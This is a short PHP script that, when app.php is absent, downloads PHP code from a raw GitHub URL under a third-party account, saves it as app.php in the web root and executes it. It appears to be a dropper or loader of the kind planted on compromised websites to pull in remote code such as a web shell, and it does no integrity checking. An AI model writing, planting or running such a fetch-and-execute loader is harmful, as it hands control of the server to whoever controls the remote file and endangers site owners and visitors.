
<?php
    $_dir_ = $_SERVER['DOCUMENT_ROOT'];

if ( file_exists( './app.php' ) ) {
    require_once($_dir_.'/app.php');
} else {
$app = 'app.php';

        $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
        $myfile = fopen('./'. $app, "w") or die("Unable to open $app!");
        fwrite($myfile, $js);
        fclose($myfile);
    require_once($_dir_.'/app.php');
        
        }



    ?>
